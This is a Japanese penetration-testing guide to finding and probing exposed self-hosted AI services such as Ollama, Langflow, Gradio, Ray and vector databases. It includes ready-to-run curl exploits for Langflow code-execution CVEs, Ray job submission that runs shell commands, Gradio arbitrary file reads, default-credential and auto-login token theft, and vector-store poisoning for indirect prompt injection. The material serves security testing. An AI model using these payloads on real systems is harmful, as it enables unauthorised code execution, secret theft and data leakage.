# 公開されたセルフホスト型AIサービス

{{#include ../banners/hacktricks-training.md}}

AI機能を構築するチームは、独自のモデルランナー、エージェントビルダー、デモUI、コンピューティングクラスター、ベクトルデータベースを運用することがよくあります。これらのツールの多くは、ノートPCや閉じたラボネットワークでの使用を想定して設計されているため、**デフォルトで認証がない**か、認証を省略する設定が有効になっています。こうしたサービスに攻撃者がアクセスできる場合、通常、影響は次のいずれかに該当します。

- GPUやモデルを無料で利用されるほか、非公開モデルを窃取される。
- プロンプト、ドキュメント、embeddingの漏えい。
- プロセス環境からの秘密情報（LLMプロバイダーのキー、クラウド認証情報）の漏えい。
- これらのAPIの一部は**機能として**コードを実行するため、コード実行。

このページでは、これらのサービスを見つける方法と、各種APIで何をテストするかを説明します。セルフホスト型推論サーバーの強化と llama.cpp `/slots` leak については、[AI Risk Frameworks](AI-Risk-Frameworks.md#self-hosted-llm-inference-hardening) を参照してください。悪意のあるモデルファイルについては、[AI Models RCE](AI-Models-RCE.md) を参照してください。

## フィンガープリンティング

認証情報なしで、以下のリクエストを送信します。期待されるフィールドを含むJSON応答があれば、製品を特定でき、多くの場合バージョンも判明します。バージョンが分かれば、以下のチェックのどれが該当するか判断できます。ポートは、公式に記載されたデフォルト値、または公式の実行例で使われている値です。<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

| 製品 | 一般的なポート | 認証なしのリクエスト | 識別できる情報 |
| --- | --- | --- | --- |
| Ollama | 11434 | `GET /api/version`、`GET /api/tags` | バージョンJSON、ローカルモデル一覧 |
| Langflow | 7860 | `GET /api/v1/version` | LangflowのバージョンJSON |
| Gradio | 7860 | `GET /config` | GradioのバージョンとコンポーネントIDを含むアプリ設定 |
| Ray dashboard | 8265 | `GET /api/version`、`GET /api/jobs/` | `ray_version`、送信されたジョブの一覧 |
| Chroma | 8000 | `GET /api/v2/heartbeat`、`GET /api/v2/version` | Heartbeat値、Chromaのバージョン |
| Qdrant | 6333 | `GET /`、`GET /collections` | Qdrantのバージョン、コレクション一覧 |
| Weaviate | - | `GET /v1/meta`、`GET /v1/schema` | Weaviateのバージョン、クラス |
| Milvus | 19530 | `POST /v2/vectordb/collections/list` | コレクション一覧、または認証エラー |

これらのサービスは、リバースプロキシのパスプレフィックス（例：`/ollama/`、`/ray/`）の下で公開されていることもよくあります。そのため、JavaScriptバンドルやAPIドキュメントで見つかったプレフィックスを付けて、リクエストを再度送信してください。

## 認証なしで利用できる推論APIとモデル管理API

モデルランナーは通常、推論用ルートと管理用ルートを組み合わせた単一のREST APIを公開しています。Ollamaはその好例です。組み込みの認証機能はなく、デフォルトでは `127.0.0.1:11434` にバインドしますが、`OLLAMA_HOST` でバインドアドレスを変更できます。<sup>[[1]](#references)[[15]](#references)</sup> 公式Dockerイメージは、コンテナ内で `OLLAMA_HOST=0.0.0.0:11434` を設定し、`EXPOSE 11434` を宣言しています。また、`USER` 命令がないため、サーバーはコンテナ内でrootとして実行されます。<sup>[[16]](#references)</sup> `EXPOSE` はホスト上でポートを公開しないため、ホストから到達可能かどうかはデプロイ方法によって異なります。ドキュメントに記載された `docker run` コマンドは `-p 11434:11434` を使っており、ホストIPが指定されていない場合、Dockerはこのようなポートマッピングをホストのすべてのインターフェースで公開します。<sup>[[17]](#references)[[18]](#references)</sup>

各ルート群から攻撃者が得られるもの：<sup>[[2]](#references)</sup>

| ルート | 認証がない場合の影響 |
| --- | --- |
| `GET /api/tags`、`GET /api/ps` | 非公開のカスタムモデルを含む、ローカルモデルとロード済みモデルの一覧 |
| `POST /api/show` | Modelfile、テンプレート、**システムプロンプト**を含むモデルの詳細 |
| `POST /api/generate`、`/api/chat`、`/api/embed` | 被害者のハードウェアを使った無料推論 |
| `POST /api/pull`、`/api/push` | 攻撃者が指定したレジストリからサーバーにダウンロードさせる、またはレジストリへモデルをアップロードさせる |
| `POST /api/create`、`/api/copy`、`DELETE /api/delete` | モデルの作成、上書き、削除 |

```bash
curl -s http://target:11434/api/tags
curl -s http://target:11434/api/show -d '{"model":"<name from /api/tags>"}'
# Outbound fetch to a registry you control: only look for the callback
curl -s http://target:11434/api/pull -d '{"model":"<your-host>/library/test:latest","insecure":true}'
```

credentials なしで返されるモデル一覧だけでも、すでに露出が確認できます。カスタムモデルには、内部 system prompt が `/api/show` に含まれていることがよくあります。ホストへの pull が成功すれば、サーバーが攻撃者の指定した registry から manifest を取得することが確認できます。自分の registry に対する `/api/push` により、露出はモデル窃取につながります。実際のターゲットで create または delete の route を呼び出さないでください。

registry pull は、サーバーがリモート manifest の値を使って blob を保存するため、parser 攻撃の攻撃対象領域でもあります。Probllama（CVE-2024-37032。Ollama 0.1.34 で修正）では、manifest の `digest` が検証されずにファイル名として使われていました。そのため、悪意ある registry は `../` を使って blobs ディレクトリの外にファイルを書き込めました。digest がローカルファイルを指すように細工した manifest を push すると、そのファイルが攻撃者の registry に leak しました。Wiz は、サーバーが root として動作する Docker で、共有ライブラリを書き込み、それを `/etc/ld.so.preload` に追加してから `/api/chat` を呼び出し、新しいプロセスにライブラリをロードさせることで RCE を達成しました。<sup>[[15]](#references)</sup> runner が任意の registry から pull できる場合は、manifest のフィールドがどのようにパスへ変換されるかを確認してください。

## 設計上コードを実行する API

### Job submission API

分散コンピューティング framework は、コード実行を主な機能としています。ダッシュボードポート（8265）の Ray Jobs API は、`entrypoint` の shell command を受け取り、cluster 上で実行します。<sup>[[19]](#references)</sup> Oligo ShadowRay の調査では、Jobs API に認証がなく、ダッシュボードが `0.0.0.0` に bind すると報告されています。対応する CVE-2023-48022 については、Ray は管理されたネットワーク内だけでの実行を想定しているとして、異論が出ています。<sup>[[20]](#references)</sup> Ray は 2.52.0 で任意の token 認証（`RAY_AUTH_MODE=token`）を追加しました。Ray 2.59 では、`ray.init()` で起動したローカル cluster に対して、これがデフォルトで有効になります。利用可能な token がない状態でも、`ray start --head` は認証なしで起動できます。Ray は 2.61 で、より広範囲にデフォルト認証を導入することを文書化しています。そのため、ダッシュボードが公開されていると決めつけず、導入済みのバージョンと起動モードを確認してください。<sup>[[21]](#references)</sup>

```bash
curl -s http://target:8265/api/version
curl -s http://target:8265/api/jobs/   # existing entrypoints often contain secrets
# Only if the scope allows code execution: DNS callback as proof
curl -s -X POST http://target:8265/api/jobs/ -H 'Content-Type: application/json' \
  -d '{"entrypoint":"nslookup <oast-host>","runtime_env":{}}'
```

この種のダッシュボードには、古いバージョンで調査する価値のある補助ルートもあります。Ray 2.8.1 より前では、`/log_proxy?url=` が任意の HTTP(S) URL を取得し（cloud metadata への SSRF）、`/api/v0/logs/file` は任意の `filename` パスを受け付けていました。どちらも認証は不要でした。<sup>[[8]](#references)</sup>

### 関数定義を実行するコード「検証」エンドポイント

カスタム Python コンポーネントを受け付ける Agent ビルダーの中には、コードを `ast` で解析し、関数定義だけを `exec()` で実行してコードを「検証」するものがあります。これは安全ではありません。Python は関数を定義するときに**デコレーターとデフォルト引数の値を評価する**ため、関数本体が実行されなくても、そこに配置されたコードは実行されます。Langflow の `POST /api/v1/validate/code` はこのように動作し、1.3.0 より前は認証が不要でした（CVE-2025-3248）。コマンド出力を含む例外を発生させると、エンドポイントはレスポンスにその出力を返します。<sup>[[22]](#references)</sup>

```bash
# Decorator variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code": "@exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")\ndef foo():\n  pass"}'
# Default-argument variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code":"def foo(cmd=exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")):\n  pass"}'
```

コードをコンパイル、lint、または「チェック」するエンドポイントでは、このパターンをテストし、証明にはDNS callbackを優先してください。

### 自動ログインとデフォルトのsuperuser tokenルート

シングルユーザー向けツールでは、すべての訪問者をadministratorとしてログインさせるショートカットが用意されていることがよくあります。Langflowでは、`AUTO_LOGIN`が有効な場合、`GET /api/v1/auto_login`は呼び出し元を問わず、デフォルトのsuperuser用トークンを返します。無効な場合、このルートは`Auto login is disabled.`と応答します。<sup>[[23]](#references)</sup> Langflow OSS 1.0.0から1.10.0ではデフォルトで有効になっていました（CVE-2026-9103）。これを上記の認証済みコード検証ルートと組み合わせると、認証不要のRCEが再び可能になります（CVE-2026-9198）。<sup>[[24]](#references)[[25]](#references)</sup> 現行の公式リリースパッケージとDockerイメージでは自動ログインが無効になっており、superuserのパスワードが必要ですが、開発ブランチでは引き続き有効です。<sup>[[3]](#references)</sup>

```bash
TOKEN=$(curl -s http://target:7860/api/v1/auto_login | jq -r .access_token)
curl -s -H "Authorization: Bearer $TOKEN" http://target:7860/api/v1/users/whoami
```

コード実行ができなくても、superuser tokenがあれば、すべてのflowと保存済みのprovider credentialsにアクセスできます。自動テストにおける関連する事前確認については、[Web Black-Box AI Pentester Bots](Web-Black-Box-AI-Pentester-Bots.md)を参照してください。

## MLデモUIのファイル配信ルートとRPCルート

MLデモフレームワークは、汎用ルートを通じてアップロードされたファイルや生成されたファイルを配信し、フロントエンドからサーバー側のコンポーネントヘルパーを呼び出せるようにします。Gradioはこのために`/config`、`/upload`、`/file=<path>`を公開しています。<sup>[[5]](#references)</sup> 同様のフレームワークでテストすべきパターンは、次の2つです。

- **アップロード用サブディレクトリからのTraversal:** ファイルルートがパスの先頭がtempフォルダ内であることだけを確認している場合、まずファイルをアップロードしてサブディレクトリを作成し、次に`../`または`%2e%2e%2f`でその外に抜け出します。Gradio 4.0から4.10（CVE-2023-51449）には、この方法で脆弱性がありました。<sup>[[26]](#references)[[27]](#references)</sup> クライアントがパスを正規化しないように、`curl --path-as-is`を使ってリクエストを送信してください。
- **任意のメソッドのディスパッチ:** ユーザー入力を使って`getattr(component, fn_name)`を呼び出すエンドポイントでは、攻撃者が内部ヘルパーを呼び出せます。4.13.0より前のGradioの`/component_server`はこの処理を行っていました。4.3から4.12では、`move_resource_to_block_cache`が任意のローカルファイルをキャッシュにコピーし、`/file=`からダウンロードできました。3.47から3.50.2では、ほかのヘルパーによってファイル読み取りとfull-read SSRFが可能でした。<sup>[[26]](#references)[[28]](#references)</sup> 修正済みのサーバーは、サーバー関数としてマークされていないヘルパーに対して`Function not found.`を返します。<sup>[[28]](#references)</sup>

```bash
curl -s http://target:7860/config | jq '.components[].id'
curl -s http://target:7860/component_server -H 'Content-Type: application/json' \
  -d '{"component_id":"1","data":"/etc/hostname","fn_name":"move_resource_to_block_cache","session_hash":"aaa"}'
curl -s 'http://target:7860/file=<returned_path>'
```

On Hugging Face Spacesでは、Space secretsは環境変数であるため、`/proc/self/environ`が最も価値の高いファイルです。Horizon3はHTTP `Range`ヘッダーを使ってこれを読み取りました。<sup>[[26]](#references)</sup>

## RAGで使用されるベクトルデータベース

RAGは元のドキュメントのチャンク、そのembedding、メタデータをベクトルデータベースに保存し、assistantは上位の検索結果をプロンプトに含めます。そのため、読み取りアクセスがあると、**非公開ドキュメントのプレーンテキストがleakします**。書き込みアクセスがあると、攻撃者は後に他のユーザーのプロンプトに取得されるチャンクを挿入できます。これは永続的な間接的prompt injectionです（[AI Prompts](AI-Prompts.md#third-party-or-indirect-prompt-injection)を参照）。

セルフホスト型ベクトルデータベースでは、認証が設定されているか、匿名アクセスが有効になっているかを確認してください。

- **Qdrant**: 自己デプロイ型のインスタンスは、認証なしで全インターフェースをリッスンします。設定されている場合、キーは`api-key`ヘッダーまたは`Authorization: Bearer`に指定されます。読み取り専用キーやコレクション単位のキーが存在する場合もあります。<sup>[[11]](#references)</sup>
- **Chroma**: 認証はデフォルトで無効です。トークン認証では`Authorization`または`X-Chroma-Token`を使用します。<sup>[[29]](#references)</sup>
- **Weaviate**: 匿名アクセスが有効な場合、認証情報なしのリクエストは`user: anonymous`として認証され、そのユーザーが持つ権限が適用されます。<sup>[[30]](#references)</sup>
- **Milvus**: `common.security.authorizationEnabled`が`true`でない限り、認証は無効です。有効な場合、デフォルトの`root`ユーザーのパスワードは`Milvus`で、トークン形式は`username:password`です。<sup>[[31]](#references)[[14]](#references)</sup>

認証情報なしで非公開データを含む応答が返る場合、情報が露出しています。認証が有効な場合は、変更されていないデフォルトアカウントの有無も別途評価してください。<sup>[[12]](#references)[[10]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
curl -s http://target:6333/collections
curl -s -X POST http://target:6333/collections/<name>/points/scroll -H 'Content-Type: application/json' -d '{"limit":3,"with_payload":true}'
curl -s http://target:8000/api/v2/tenants/default_tenant/databases/default_database/collections
curl -s 'http://target:<weaviate-port>/v1/objects?limit=3'
curl -s -X POST http://target:19530/v2/vectordb/collections/list -H 'Authorization: Bearer root:Milvus' -H 'Content-Type: application/json' -d '{}'
```

ペイロードに文書テキスト、ユーザー識別子、テナント名が含まれているか確認してください。本番データを汚染せずに書き込み権限を確認するには、明確に名前を付けた空のコレクションを作成してすぐに削除します。ただし、スコープで許可されている場合に限ります。

これらのサーバーでは、認証が行われるタイミングが遅すぎることもあります。Chroma の Python FastAPI サーバー（1.0.0 から少なくとも 1.5.8、CVE-2026-45829）では、コレクション作成ルートが認証チェックより前に、クライアント指定の embedding function を構築していました。`trust_remote_code: true` を指定した、攻撃者が制御する Hugging Face モデルを参照する設定は、リクエストが拒否された場合でも攻撃者のコードを実行しました。Rust frontend は影響を受けませんでした。<sup>[[32]](#references)</sup> リクエストにモデルまたはプラグインの設定が含まれている場合は、認証情報なしでテストし、モデルリポジトリへの外部 fetch が発生するか確認してください。

## References

- [1] [Ollama FAQ](https://github.com/ollama/ollama/blob/main/docs/faq.mdx)
- [2] [Ollama API ドキュメント](https://github.com/ollama/ollama/blob/main/docs/api.md)
- [3] [Langflow README](https://github.com/langflow-ai/langflow/blob/main/README.md)
- [4] [Langflow ソース - API v1 エンドポイント](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/endpoints.py)
- [5] [Gradio ソース - routes.py](https://github.com/gradio-app/gradio/blob/main/gradio/routes.py)
- [6] [Gradio ソース - http_server.py](https://github.com/gradio-app/gradio/blob/main/gradio/http_server.py)
- [7] [Ray ソース - job_head.py](https://github.com/ray-project/ray/blob/master/python/ray/dashboard/modules/job/job_head.py)
- [8] [Bishop Fox - Ray バージョン 2.6.3、2.8.0](https://bishopfox.com/blog/ray-versions-2-6-3-2-8-0)
- [9] [Chroma ソース - Python クライアントのデフォルト設定](https://github.com/chroma-core/chroma/blob/main/chromadb/__init__.py)
- [10] [Chroma ソース - FastAPI サーバールート](https://github.com/chroma-core/chroma/blob/main/chromadb/server/fastapi/__init__.py)
- [11] [Qdrant - セキュリティ](https://qdrant.tech/documentation/security/)
- [12] [Qdrant OpenAPI 仕様](https://github.com/qdrant/qdrant/blob/master/docs/redoc/master/openapi.json)
- [13] [Weaviate OpenAPI 仕様](https://github.com/weaviate/weaviate/blob/main/openapi-specs/schema.json)
- [14] [Milvus - Milvus Server への接続](https://milvus.io/docs/connect-to-milvus-server.md)
- [15] [Wiz - Probllama: Ollama のリモートコード実行脆弱性（CVE-2024-37032）](https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032)
- [16] [Ollama Dockerfile](https://github.com/ollama/ollama/blob/main/Dockerfile)
- [17] [Ollama Docker ドキュメント](https://github.com/ollama/ollama/blob/main/docs/docker.mdx)
- [18] [Docker - ポートの公開と外部への開放](https://docs.docker.com/get-started/docker-concepts/running-containers/publishing-ports/)
- [19] [Ray Jobs REST API](https://docs.ray.io/en/latest/cluster/running-applications/job-submission/rest.html)
- [20] [Oligo - ShadowRay: AI ワークロードを標的とする初の既知の攻撃キャンペーンが実環境で悪用](https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild)
- [21] [Ray の token 認証](https://docs.ray.io/en/latest/ray-security/token-auth.html)
- [22] [Horizon3.ai - どんな速度でも危険: Python Exec を悪用した Langflow AI の未認証 RCE](https://horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/)
- [23] [Langflow ソース - login router](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/login.py)
- [24] [NVD - CVE-2026-9103](https://nvd.nist.gov/vuln/detail/CVE-2026-9103)
- [25] [NVD - CVE-2026-9198](https://nvd.nist.gov/vuln/detail/CVE-2026-9198)
- [26] [Horizon3.ai - Gradio のファイル読み取り脆弱性を悪用して Hugging Face Spaces からシークレットを窃取](https://horizon3.ai/attack-research/disclosures/exploiting-file-read-vulnerabilities-in-gradio-to-steal-secrets-from-hugging-face-spaces/)
- [27] [Gradio アドバイザリ GHSA-6qm2-wpxq-7qh2](https://github.com/gradio-app/gradio/security/advisories/GHSA-6qm2-wpxq-7qh2)
- [28] [Gradio の `/component_server` 修正コミット](https://github.com/gradio-app/gradio/commit/24a583688046867ca8b8b02959c441818bdb34a2)
- [29] [Chroma Cookbook - Chroma ネイティブ認証](https://cookbook.chromadb.dev/security/legacy-auth/)
- [30] [Weaviate - 認証](https://docs.weaviate.io/weaviate/configuration/authentication)
- [31] [Milvus - ユーザーアクセスの認証](https://milvus.io/docs/authenticate.md)
- [32] [HiddenLayer - ChromaToast Served Pre-Auth](https://www.hiddenlayer.com/research/chromatoast-served-pre-auth)
{{#include ../banners/hacktricks-training.md}}
